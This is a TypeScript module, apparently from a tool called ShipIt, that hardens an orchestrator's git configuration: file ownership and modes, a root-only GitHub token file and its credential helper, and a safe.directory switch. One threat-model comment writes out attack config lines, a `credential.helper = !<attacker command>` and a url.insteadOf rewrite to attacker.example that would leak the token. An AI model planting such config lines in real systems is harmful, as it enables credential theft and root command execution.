/**
 * Global git config management.
 *
 * Uses GIT_CONFIG_GLOBAL env var to point at a file in the persistent
 * credentials directory. All session repos inherit user.name/user.email
 * automatically via git's config hierarchy — no per-repo identity setup needed.
 */

import { execFileSync } from "node:child_process";
import fs from "node:fs";
import path from "node:path";
import { chownToSessionWorker, sessionWorkerUid } from "./session-worker-uid.js";
import { gitArgsWithHooksDisabled } from "../shared/git-hooks-guard.js";

/**
 * Narrow a path's mode to at most {@link mode}, best-effort.
 *
 * `mkdirSync`'s `mode` applies only when the directory is CREATED, so a
 * deployment that already has a 0755 `/credentials` from before docs/266 would
 * keep it forever without this. Never throws: a credentials dir we cannot chmod
 * (a bind mount owned by someone else, a read-only fs in a test) must not stop
 * the orchestrator from booting.
 */
function tightenMode(target: string, mode: number): void {
  try {
    fs.chmodSync(target, mode);
  } catch (err) {
    console.warn(
      `[git-config] could not tighten mode on ${target}:`,
      err instanceof Error ? err.message : String(err),
    );
  }
}

export interface GitIdentity {
  name: string;
  email: string;
}

/**
 * docs/266-orchestrator-git-trust-boundary E2 (planning#403) — is git's own ownership check armed for
 * orchestrator-side git?
 *
 * Off by default, which is today's behaviour exactly. Turning it on is a
 * deliberate operator decision, described in {@link applySafeDirectoryPolicy}.
 */
export function gitStrictOwnership(env: NodeJS.ProcessEnv = process.env): boolean {
  return env.SHIPIT_GIT_STRICT_OWNERSHIP === "1";
}

/**
 * Decide whether the orchestrator's global gitconfig grants `safe.directory=*`.
 *
 * ## What the `*` does, and why it was right
 *
 * docs/150 §7 addendum (planning#33 activation blocker). When the session worker
 * runs as an unprivileged uid (`SHIPIT_SESSION_WORKER_UID` set), each session's
 * workspace under `/workspace` is owned by that uid (e.g. 1000), while the
 * orchestrator ran git as **root**. Git's CVE-2022-24765 ownership check then
 * refuses every orchestrator-side git op on those trees with "detected dubious
 * ownership" — auto-commit, auto-push, branch graduation, the bare-cache fetch.
 * The `*` suppressed that refusal, and one entry covered the bare cache, every
 * per-session worktree, and any future path without an enumerate-on-create
 * dance.
 *
 * ## Why it is now the wrong shape (docs/266-orchestrator-git-trust-boundary req 7)
 *
 * E1 made orchestrator-side git run as the uid that OWNS the tree, so the
 * refusal it suppresses no longer fires on a *correct* call site. What it still
 * suppresses is the refusal on an **incorrect** one — a call site that failed to
 * drop keeps running as root against a tree untrusted code can write, silently,
 * exactly as before. Remove the `*` and that becomes a loud
 * `fatal: detected dubious ownership`. That is the property that makes the
 * guard hold for code nobody has written yet, and it is enumeration-free: the
 * question is "is this tree mine", never "is this config key dangerous".
 *
 * Two facts about `safe.directory`, both **measured here** against git 2.39.5
 * using `GIT_TEST_ASSUME_DIFFERENT_OWNER=1`:
 *
 *   - A **repo-local** `safe.directory` is NOT honoured. This is the half the
 *     design rests on: the untrusted side owns `.git/config` and cannot use it
 *     to grant itself trust.
 *   - Everything ShipIt itself hands the git process CAN re-grant trust. Git
 *     honours `safe.directory` from its "protected configuration" — the system
 *     and global files, the command line, and the config environment protocols
 *     — so a `-c safe.directory=*` and the `GIT_CONFIG_*` env protocols are
 *     honoured just as this global file is. Earlier ShipIt docs said `-c` never
 *     was; the correction is recorded in docs/266's `requirements.md`.
 *
 *     Stated as a rule rather than as a list of vectors on purpose. The list
 *     has been falsified twice — first `-c`, then `GIT_CONFIG_PARAMETERS`
 *     beside the `GIT_CONFIG_COUNT` the first correction named — and a third
 *     will not announce itself. The rule that survives both: only the
 *     repository's own config cannot grant it.
 *
 *     **This is not a hole in the boundary.** A `-c` and an environment
 *     variable come from ShipIt's OWN argv and environment; the untrusted side
 *     supplies neither. What it is, is a maintenance rule — ShipIt's own code
 *     could silence the refusal one `-c safe.directory=*` at a time, most
 *     plausibly by someone debugging "git suddenly refuses this path" the
 *     fastest way rather than the right way. So it is enforced as a rule rather
 *     than written down as advice: `git-hooks-guard-coverage.test.ts` fails the
 *     build if any orchestrator-side source outside this module passes the key
 *     to git, or sets `GIT_CONFIG_COUNT`.
 *
 * ## Why this is a switch and not a deletion
 *
 * Removing the `*` turns every missed call site into a hard failure **at once**,
 * and the failure lands on the post-turn commit path, where uncommitted agent
 * work has no reflog entry and no recovery (`CLAUDE.md` invariant 2). E1 is
 * inert unless the process is root, so it cannot be exercised for real anywhere
 * but a production orchestrator. The sequence the issue sets out is: land E1,
 * observe it in production, then arm this.
 *
 * `SHIPIT_GIT_STRICT_OWNERSHIP=1` is that "then" — an operator decision, made
 * against a running deployment, reversible by unsetting it and restarting rather
 * than by shipping a revert. Both directions are idempotent and self-repairing:
 * the config file lives in the persistent credentials volume, so arming must
 * actively `--unset-all` an entry an earlier boot wrote, and disarming rewrites
 * it.
 *
 * **This switch has an expiry: planning#410.** A flag with no owner becomes
 * permanent, and a permanent one is a supported way to turn the boundary back
 * off. The end state is deleting BOTH halves — this function's branch and the
 * `safe.directory=*` write — once it has run armed in production, leaving
 * fail-closed as simply how ShipIt works.
 */
function applySafeDirectoryPolicy(): void {
  if (gitStrictOwnership()) {
    try {
      // Exits 5 when there is nothing to unset — the normal first-boot case.
      execFileSync("git", gitArgsWithHooksDisabled(["config", "--global", "--unset-all", "safe.directory"]), {
        stdio: "ignore",
      });
    } catch {
      // Nothing to remove, or git is not installed yet.
    }
    return;
  }
  // Gated: with `SHIPIT_SESSION_WORKER_UID` unset (root worker) nothing is
  // written and behaviour is byte-for-byte unchanged. `--replace-all` keeps it
  // idempotent across repeated init calls (tests).
  if (sessionWorkerUid() === null) return;
  try {
    execFileSync("git", gitArgsWithHooksDisabled(["config", "--global", "--replace-all", "safe.directory", "*"]));
  } catch {
    // git may not be installed yet (unlikely but safe)
  }
}

/**
 * Filename, beside `.gitconfig`, of the root-only file holding the GitHub PAT
 * in git-credential-helper output format (`username=…\npassword=…`).
 *
 * docs/266-orchestrator-git-trust-boundary E3. Deliberately NOT `.git-credentials` — that is git's own
 * `credential-store` format (a list of `https://user:pass@host` URLs), and a
 * file with that name in a directory git might treat as `$HOME` could be picked
 * up by a helper nobody configured. This one is only ever read by the inline
 * `cat` helper {@link setGlobalCredentialHelper} installs.
 */
export const GLOBAL_CREDENTIAL_FILENAME = ".git-credential-github";

/**
 * Where {@link GLOBAL_CREDENTIAL_FILENAME} lives, derived from the same
 * credentials directory `GIT_CONFIG_GLOBAL` points into.
 *
 * Derived rather than passed because {@link setGlobalCredentialHelper} is
 * called from token-install paths that never saw the credentials dir
 * (`GitHubAuthManager.setToken`, the boot re-install). `initGlobalGitConfig`
 * always runs first and sets the variable; the literal is the production
 * default and only matters if a caller inverts that order.
 */
function globalCredentialFilePath(): string {
  const configPath = process.env.GIT_CONFIG_GLOBAL;
  return path.join(configPath ? path.dirname(configPath) : "/credentials", GLOBAL_CREDENTIAL_FILENAME);
}

/**
 * Write the PAT where only root can read it.
 *
 * `writeFileSync`'s `mode` applies only on creation, so the explicit `chmodSync`
 * is what repairs a file an older build left at a looser mode — the same reason
 * `CredentialStore.save` does it. No `chownToSessionWorker` here, ever: this
 * file staying root-owned IS the control.
 */
function writeRootOnlyCredentialFile(target: string, token: string): void {
  fs.mkdirSync(path.dirname(target), { recursive: true, mode: 0o711 });
  fs.writeFileSync(target, `username=x-access-token\npassword=${token}\n`, { mode: 0o600 });
  tightenMode(target, 0o600);
}

/**
 * Quote a path for the `sh -c` the `!`-prefixed helper runs as.
 *
 * The path is ShipIt's own (a directory the operator configures plus a frozen
 * filename), never repo- or user-controlled, so this is defence against an
 * awkward mount path rather than against an attacker. A literal `'` cannot be
 * expressed inside single quotes, so it is escaped the POSIX way.
 */
function singleQuote(value: string): string {
  return `'${value.replaceAll("'", "'\\''")}'`;
}

/**
 * Set GIT_CONFIG_GLOBAL to a file in the credentials directory so all git
 * operations (in any repo) inherit identity and settings from a single place.
 *
 * Also disables commit signing and migrates identity from the legacy
 * credential store JSON if present.
 */
export function initGlobalGitConfig(credentialsDir: string): void {
  // docs/266 — 0711, not the default 0755 and deliberately NOT 0700.
  //
  // This directory holds the credential store, the GitHub PAT
  // (`GLOBAL_CREDENTIAL_FILENAME`, root-only since E3) and the orchestrator's
  // `.gitconfig`. At 0755 every uid in the orchestrator container could list it
  // and read whatever inside was not itself 0600 — harmless while nothing
  // non-root ran there, and load-bearing the moment orchestrator git drops uid.
  //
  // 0700 was the first attempt and it is WRONG: it also denies *traversal*, and
  // orchestrator git that has dropped to the session uid has to reach
  // `.gitconfig` in here. uid 1000 would EACCES on the path before reaching the
  // file, so every dropped commit would fail with "Author identity unknown" and
  // every push would lose its credential helper — breaking the one path
  // invariant 2 says cannot fail. Caught in review before it shipped.
  //
  // 0711 is the traverse-but-not-list mode: a uid that knows the exact filename
  // can open it, nothing can enumerate the directory, and each file's own mode
  // and owner still decide who reads it.
  fs.mkdirSync(credentialsDir, { recursive: true, mode: 0o711 });
  tightenMode(credentialsDir, 0o711);
  const configPath = path.join(credentialsDir, ".gitconfig");
  process.env.GIT_CONFIG_GLOBAL = configPath;

  // Migrate from legacy shipit-credentials.json if global config has no identity
  migrateLegacyIdentity(credentialsDir);

  // Ensure commit signing is always disabled
  try {
    execFileSync("git", gitArgsWithHooksDisabled(["config", "--global", "commit.gpgsign", "false"]));
  } catch {
    // git may not be installed yet (unlikely but safe)
  }

  applySafeDirectoryPolicy();

  // docs/200 — make the orchestrator's git transport-agnostic for github.com.
  // An SSH origin (`git@github.com:owner/repo.git`) is unusable from inside the
  // orchestrator container: the image ships no SSH key and no `known_hosts`, so
  // any git op over SSH dies with "Host key verification failed" before auth is
  // ever attempted. This silently broke the self-update check — a host whose
  // `/opt/shipit` origin was re-pointed at an SSH URL (e.g. when moving the
  // private upstream onto a deploy key) could no longer fetch updates, even with
  // a perfectly valid GitHub token: SSH never consults the credential helper.
  //
  // Rewrite GitHub SSH URLs to HTTPS for ALL orchestrator git ops via a global
  // `url.<base>.insteadOf`. HTTPS then flows through the global credential helper
  // (the Settings-UI token installed by setGlobalCredentialHelper), which is how
  // every other orchestrator git op already authenticates. Scope: this writes
  // only the orchestrator's GIT_CONFIG_GLOBAL — session containers get a separate
  // sanitized config (writeContainerGitConfig), and the host's own git config is
  // untouched, so a host-side SSH deploy key keeps working for update.sh.
  //
  // `--replace-all <key> <value> <value_regex>` keeps each entry single and
  // idempotent across repeated init calls: the value_regex matches only this one
  // entry, so a re-run replaces it in place instead of appending a duplicate.
  const GITHUB_HTTPS_INSTEAD_OF = "url.https://github.com/.insteadOf";
  for (const [from, valueRegex] of [
    ["git@github.com:", "^git@github\\.com:$"],
    ["ssh://git@github.com/", "^ssh://git@github\\.com/$"],
  ] as const) {
    try {
      execFileSync("git", gitArgsWithHooksDisabled([
        "config", "--global", "--replace-all", GITHUB_HTTPS_INSTEAD_OF, from, valueRegex,
      ]));
    } catch {
      // git may not be installed yet (unlikely but safe)
    }
  }

  // Force git to never open an editor. The orchestrator runs git non-interactively
  // (e.g. `git rebase --continue` after agent-driven conflict resolution), and the
  // container has no editor installed. Without this, `git rebase --continue` fails
  // with "cannot run editor: No such file or directory" — the rebase is aborted
  // and the agent's resolution edits are discarded silently. `GIT_EDITOR=true`
  // makes the editor a no-op that succeeds, preserving the original commit message.
  // docs/266 — last, so it covers every `git config --global` write above.
  shareGlobalGitConfigWithWorker(credentialsDir);

  if (!process.env.GIT_EDITOR) {
    process.env.GIT_EDITOR = "true";
  }

  pinGitMessageLocale();
}

/**
 * docs/266 / planning#407 — pin git's message LANGUAGE for this process and
 * everything it spawns.
 *
 * `shared/git.ts` classifies the two unreadable-workspace states by matching
 * git's stderr text, because simple-git's `GitError` carries no exit code
 * (`errorDetectionPlugin` never puts one on it). Git translates those messages
 * under a non-C locale, so a deployment that sets `LANG` — or a base image that
 * starts shipping one — would silently switch the detection off and return a
 * turn to committing short in silence, which is the outcome requirement 14
 * exists to prevent. Today's images set no locale at all, so this pins what is
 * currently true by accident.
 *
 * Set on `process.env` rather than through simple-git, because simple-git
 * cannot carry it: `env(object)` ASSIGNS the executor environment (so any
 * caller chaining `.env()` discards it — the trap that killed the
 * `GIT_CONFIG_GLOBAL` override), and forwarding `process.env` to make it stick
 * is worse still, since `blockUnsafeOperationsPlugin` inspects the env it is
 * handed and would refuse every command over `GIT_CONFIG_GLOBAL`. The process
 * environment is what the default (`env: null`) spawn inherits, what both
 * `.env({ ...process.env })` callers spread, and what the raw
 * `execFileSync`/`spawn` git sites inherit — one place, all of them.
 *
 * `C` and not `C.UTF-8`: the latter does not exist on every host this can run
 * on (local mode, macOS), where the invalid value makes git warn on stderr —
 * into the very capture the classifier reads.
 *
 * **Separate from {@link initGlobalGitConfig}, and called separately.** That
 * function is skipped entirely when `GIT_CONFIG_GLOBAL` is already set
 * (`app-di.ts`) — so folding the pin into it left it un-pinned on exactly the
 * deployments most likely to have a locale of their own (review finding).
 * Overriding is deliberate rather than deferential — determinism is the whole
 * point — but an operator's value is never dropped silently: it is logged.
 */
export function pinGitMessageLocale(): void {
  const previous = process.env.LC_ALL;
  if (previous !== undefined && previous !== "C") {
    console.log(
      `[git-config] overriding LC_ALL=${previous} with C — ShipIt matches git's English `
      + "stderr to detect workspace content it cannot read (docs/266-orchestrator-git-trust-boundary reqs 14, 15)",
    );
  }
  process.env.LC_ALL = "C";
}

/**
 * Absolute path of the brokering git credential helper installed in the
 * session worker image (see `src/server/session/agent-shim/git-credential.ts`
 * and the `shipit-git-credential` install in `docker/Dockerfile.session-worker.*`).
 *
 * Used as the `credential.helper` value in the *container's* gitconfig. It's an
 * absolute path so git invokes it directly rather than prepending
 * `git credential-` (git's rule for bare helper names).
 */
export const CONTAINER_CREDENTIAL_HELPER = "/usr/local/bin/shipit-git-credential";

/**
 * Identity written into a session container's gitconfig when the user has
 * configured none. Its only job is to keep `git commit` from hard-failing
 * inside the container; a real identity always wins. `.invalid` is the RFC 2606
 * reserved TLD, so the address can never resolve to a real mailbox and is
 * obvious as a placeholder in `git log`. See {@link writeContainerGitConfig}.
 */
export const FALLBACK_CONTAINER_GIT_IDENTITY: GitIdentity = {
  name: "ShipIt Agent",
  email: "agent@shipit.invalid",
};

/**
 * Write a *sanitized* gitconfig for a session container at `destPath`.
 *
 * Unlike the orchestrator's own global gitconfig (which embeds the GitHub PAT
 * inline via {@link setGlobalCredentialHelper}), this file NEVER contains the
 * token. It carries:
 *   - the user's git identity (copied from the orchestrator's global config so
 *     authorship is preserved),
 *   - `commit.gpgsign = false` (the container has no signing key),
 *   - `credential.helper = ` the brokering {@link CONTAINER_CREDENTIAL_HELPER},
 *     which fetches the token from the worker over localhost at git-time.
 *
 * This is the fix for docs/088-security-audit finding #5: a prompt-injected
 * agent that reads `/credentials/.gitconfig` (or runs `git credential fill`)
 * gets the helper *path*, not the PAT. The token only ever transits the
 * helper→worker→orchestrator localhost broker.
 *
 * The file is written fresh (0o600) on each call — cheap and idempotent — so
 * an identity rotation on the orchestrator propagates on the next provision.
 */
/**
 * docs/266 — make the orchestrator's single global gitconfig readable by the
 * session-worker uid, and by nobody else.
 *
 * ## Why there is only one config
 *
 * The first implementation wrote a *second*, "token-free" config for
 * dropped-uid git and pointed `GIT_CONFIG_GLOBAL` at it through the child
 * environment. Review killed it, and it deserved to:
 *
 *   - **It did not work.** The file lived in a 0700 root-owned `/credentials`,
 *     so uid 1000 could not traverse to a file it owned. Every dropped commit
 *     would have failed with "Author identity unknown".
 *   - **The override was not durable.** simple-git's `env(object)` *assigns*
 *     the executor environment, so any caller chaining `.env()` after
 *     `safeSimpleGit` — `git-utils.ts` and `repo-git.ts` both do — silently
 *     discarded it while the uid drop stayed in force. That combination is
 *     worse than not trying: dropped uid, root's config.
 *   - **It bought nothing at the time.** Its whole purpose was keeping the PAT
 *     away from the worker uid, but a dropped-uid git must `push`, so the token
 *     had to be reachable by that uid anyway. Two files, an env override and an
 *     `allowUnsafeConfigPaths` opt-in, all to hide a secret that had to be
 *     visible.
 *
 * So: one config, no environment override to be clobbered.
 *
 * **docs/266-orchestrator-git-trust-boundary E3 (planning#404) removed the last reason to want a second file,
 * and changed how this one is shared.** The third bullet no longer holds: the
 * dropped git gets a repo-scoped credential of its own per remote op
 * (`shared/git-remote-credential.ts`), so the PAT does not have to be visible
 * to it — and it is not, because `setGlobalCredentialHelper` keeps the token in
 * a root-only file beside this config rather than inline in it. What is left
 * here is identity, `commit.gpgsign`, `url.insteadOf` and `safe.directory`: no
 * secret. Splitting the *config* would still buy nothing; splitting the
 * *secret* out of it bought everything.
 *
 * E1 handed this file to the **worker uid at 0600**, which it had to while the
 * file carried the PAT. With the secret gone that ownership is strictly worse
 * than the alternative, because owning a file is permission to *write* it —
 * see {@link restoreRootOwnership} for the two root-side executions that buys.
 * So it is **root-owned 0644** now: the worker reads it, and only root writes.
 */
function reshareGlobalGitConfig(): void {
  const configPath = process.env.GIT_CONFIG_GLOBAL;
  if (!configPath) return;
  shareGlobalGitConfigWithWorker(path.dirname(configPath));
}

function shareGlobalGitConfigWithWorker(credentialsDir: string): void {
  if (sessionWorkerUid() === null) return;
  const configPath = path.join(credentialsDir, ".gitconfig");
  if (!fs.existsSync(configPath)) return;
  // Readable by the worker uid, writable by nobody but root.
  tightenMode(configPath, 0o644);
  restoreRootOwnership(configPath);
}

/**
 * Take a path back to `root:root`, best-effort.
 *
 * E1 left this file **owned by the worker uid** — it had to, because the file
 * carried the inline PAT at 0600 and the dropped git had to read it. E3 removed
 * the secret, and that ownership is now the sharper problem: mode 0600 plus
 * owner uid 1000 means the untrusted side can *write* the file, in place, with
 * no directory write needed. It does not have to steal the PAT; it can rewrite
 * this config and wait, because **root-side** git reads it too
 * (`GIT_CONFIG_GLOBAL` is inherited by every child, and the bare-cache fetch and
 * the self-update have no `-c credential.helper=` reset):
 *
 *   - `credential.helper = !<attacker command>` runs that command **as root**,
 *     which can then read the root-only credential file. Requirement 1's exact
 *     worst case, through requirement 3's exact key class.
 *   - `url.https://attacker.example/.insteadOf = https://github.com/` sends the
 *     next root-side fetch elsewhere, where the (host-blind) global helper hands
 *     over the PAT — docs/172 Gap 2's host confusion, re-created one level up.
 *
 * Neither needs the config to be *readable* by the attacker, so tightening the
 * mode would not have helped; the writability is the whole bug. Now that the
 * file holds no secret, the right shape is the plain one: root-owned, 0644,
 * world-readable inside the orchestrator container and writable only by the
 * process that maintains it. Found by the independent review of PR #2341.
 *
 * Called on every write path rather than once at boot, because `git config`
 * rewrites through a lock+rename — the inode changes, so ownership has to be
 * re-asserted after each write, exactly as the old chown-to-worker did.
 */
function restoreRootOwnership(target: string): void {
  // Only root can give a file away, and only a containerized orchestrator has a
  // worker uid to take it back from. Everywhere else this is a no-op.
  if (process.getuid?.() !== 0) return;
  try {
    fs.lchownSync(target, 0, 0);
  } catch (err) {
    console.warn(
      `[git-config] could not restore root ownership of ${target}:`,
      err instanceof Error ? err.message : String(err),
    );
  }
}

export function writeContainerGitConfig(destPath: string): void {
  fs.mkdirSync(path.dirname(destPath), { recursive: true });
  // Start from an empty file so a stale (token-bearing) config from a previous
  // build can never linger. 0o600 matches the credential-store permissions.
  fs.writeFileSync(destPath, "", { mode: 0o600 });

  const set = (key: string, value: string): void => {
    execFileSync("git", gitArgsWithHooksDisabled(["config", "--file", destPath, key, value]));
  };

  // The user's real identity when there is one, a placeholder when there isn't.
  // Never left unset: `git commit` HARD-FAILS without an identity ("Author
  // identity unknown"), and for `ops` / `sandbox` sessions the agent's own
  // commits are the only commits there are — ShipIt does not auto-commit those
  // kinds (`services/auto-commit-gate.ts`), so an identity-less container means
  // the agent simply cannot save its work. A sandbox is the worst case: it is
  // repo-less by design and may be created with `capabilities.git` OFF, so
  // connecting GitHub — the usual way an identity gets set — is not part of its
  // flow at all.
  //
  // This deliberately does NOT go in `initGlobalGitConfig` / `getGitIdentity`.
  // Those answer "has the user configured an identity?", which drives the
  // `git_identity_required` prompt (`route-registry.ts`); defaulting there would
  // suppress the prompt and silently attribute the user's commits to a
  // placeholder forever. Here the fallback is a floor for a generated,
  // container-only file, and a real identity always overrides it — including
  // retroactively, since `writeSessionGitConfig` rewrites this file.
  const id = getGitIdentity() ?? FALLBACK_CONTAINER_GIT_IDENTITY;
  set("user.name", id.name);
  set("user.email", id.email);
  set("commit.gpgsign", "false");
  set("credential.helper", CONTAINER_CREDENTIAL_HELPER);

  // docs/150 §7 — hand the file to the unprivileged worker user *after* all
  // `git config --file` writes finish (no-op unless SHIPIT_SESSION_WORKER_UID
  // is set). Chowning earlier would leave the root orchestrator writing into a
  // 1000-owned file: it works today but is a trap if the steps are reordered.
  // The 0o600 mode is preserved — the only reader is `shipit`.
  chownToSessionWorker(destPath);
}

/**
 * Read git identity from the global config.
 * Returns null if user.name or user.email is not set.
 */
export function getGitIdentity(): GitIdentity | null {
  try {
    const name = execFileSync("git", gitArgsWithHooksDisabled(["config", "--global", "user.name"]), {
      encoding: "utf-8",
    }).trim();
    const email = execFileSync("git", gitArgsWithHooksDisabled(["config", "--global", "user.email"]), {
      encoding: "utf-8",
    }).trim();
    if (name && email) return { name, email };
    return null;
  } catch {
    return null;
  }
}

/**
 * Write git identity to the global config. All repos inherit it automatically.
 */
export function setGitIdentity(name: string, email: string): void {
  execFileSync("git", gitArgsWithHooksDisabled(["config", "--global", "user.name", name]));
  execFileSync("git", gitArgsWithHooksDisabled(["config", "--global", "user.email", email]));
}

/**
 * Install the GitHub token as a *global* git credential helper.
 *
 * Single source of truth: the orchestrator and every session container both
 * point `GIT_CONFIG_GLOBAL` at `/credentials/.gitconfig`, so writing here
 * means every workspace — already-cloned, warm, freshly-claimed, agent-driven
 * — inherits the token automatically without a per-workspace backfill. This
 * is the fix for the W4-class bug: warm sessions created while the token was
 * (temporarily) cleared had no local credential helper, and the per-session
 * backfill in `setGitHubToken` skips warm rows (filtered by `list()`),
 * leaving them permanently broken until the next claim.
 *
 * Stored as a shell one-liner that echoes the token on demand — matches the
 * format `configureGitCredentials` already writes per-workspace, so behavior
 * is identical at the git layer.
 */
export function setGlobalCredentialHelper(token: string): void {
  // docs/266-orchestrator-git-trust-boundary E3 (planning#404) — the PAT is written to a ROOT-ONLY file and the
  // config carries only the path.
  //
  // It used to be inline: `!f() { echo "password=<TOKEN>"; …}; f` in the config
  // itself. E1 then had to make that config readable by the session-worker uid,
  // because a dropped-uid git reads it for identity and for the credential it
  // needs to push — so the PAT became readable by the one principal that can
  // also *execute* there. Requirement 11's "equal authority is not an
  // escalation" argument does not stretch to cover that: the PAT reaches every
  // repository the operator's account can, which is broader than anything the
  // session container can obtain from its own broker.
  //
  // Splitting the secret out of the file fixes it without splitting the file.
  // The config stays exactly as shareable as it was (identity, `commit.gpgsign`,
  // `url.insteadOf`, `safe.directory`) and now carries no secret at all; the
  // token sits beside it at 0600, owned by root and never chowned. Root git is
  // unaffected — it reads the file and the helper echoes what it read. A
  // dropped-uid git gets EACCES, `cat` prints nothing (stderr discarded so the
  // failure adds no noise to the stderr classifiers docs/266-orchestrator-git-trust-boundary E5-detect matches
  // on), and git moves on to the next helper: the repo-scoped one that
  // `GitManager` supplies per remote op (`shared/git-remote-credential.ts`).
  //
  // Measured against git 2.39.5 before choosing this shape, because two
  // neighbouring mechanisms behave in opposite ways and only one is survivable:
  // an unreadable `GIT_CONFIG_GLOBAL` is silently ignored, but an unreadable
  // `include.path` is a hard `fatal: unable to access` on *every* git command.
  // So the token could not be pulled in by an include.
  const credentialPath = globalCredentialFilePath();
  writeRootOnlyCredentialFile(credentialPath, token);
  // `2>/dev/null` on the `cat`, but a LOUD line when the file is not there at
  // all. The two failures are different and only one of them is expected:
  //
  //   - **Unreadable** (EACCES) is the designed state for a dropped-uid git and
  //     happens on every session-workspace remote op, so it must stay silent —
  //     both to keep noise out of E5-detect's stderr classifiers and because it
  //     is not a fault.
  //   - **Missing** is a real fault on the root path — a wiped credentials
  //     volume, a failed first write, a `clear` that raced an install — and it
  //     degrades into "could not read Username" with nothing anywhere saying
  //     why. That is the silent-degradation class invariant 3 exists to
  //     prevent, so it gets a line on stderr.
  //
  // `[ -e … ]` separates them exactly: it needs traverse on the directory (0711
  // grants it to everyone) but no read on the file, so it is true for the
  // dropped uid and false only when the file genuinely is not there.
  // Review finding on PR #2341.
  const quoted = singleQuote(credentialPath);
  const helper = `!f() { [ -e ${quoted} ] || { echo "shipit: git credential file missing at ${credentialPath}" >&2; return 1; }; cat ${quoted} 2>/dev/null; }; f`;
  execFileSync("git", gitArgsWithHooksDisabled(["config", "--global", "credential.helper", helper]));
  // `git config` rewrites the file through a lock+rename, so the new inode is
  // root-owned again. Re-share it, or the dropped-uid git loses the identity
  // and the `url.insteadOf` rewrites it was just given — silently, on the next
  // commit.
  reshareGlobalGitConfig();
}


/**
 * Remove the global credential helper. Called on logout / token-invalidation
 * so a freshly-rotated PAT (or a "signed out" state) is not silently masked
 * by a stale helper still echoing the old token.
 */
export function clearGlobalCredentialHelper(): void {
  try {
    execFileSync("git", gitArgsWithHooksDisabled(["config", "--global", "--unset", "credential.helper"]));
  } catch {
    // Already unset — `git config --unset` exits non-zero in that case.
  }
  // docs/266-orchestrator-git-trust-boundary E3 — the token lives beside the config now, so unsetting the key
  // is no longer the whole revocation. Remove the file too, or a revoked PAT
  // stays on disk until the next one overwrites it.
  try {
    fs.rmSync(globalCredentialFilePath(), { force: true });
  } catch (err) {
    console.warn(
      "[git-config] could not remove the global credential file:",
      err instanceof Error ? err.message : String(err),
    );
  }
  reshareGlobalGitConfig();
}

/**
 * One-time migration: if the legacy shipit-credentials.json has a git identity
 * but the global git config doesn't, copy it over.
 */
function migrateLegacyIdentity(credentialsDir: string): void {
  // Only migrate if global config has no identity yet
  if (getGitIdentity()) return;

  try {
    const credsFile = path.join(credentialsDir, "shipit-credentials.json");
    const raw = fs.readFileSync(credsFile, "utf-8");
    const data = JSON.parse(raw) as Record<string, unknown>;
    const id = data.gitIdentity as Record<string, unknown> | undefined;
    if (
      id &&
      typeof id.name === "string" &&
      id.name.trim() &&
      typeof id.email === "string" &&
      id.email.trim()
    ) {
      setGitIdentity(id.name.trim(), id.email.trim());
      console.log("[git-config] Migrated identity from credential store:", id.name);
    }
  } catch {
    // No credentials file or parse error — nothing to migrate
  }
}
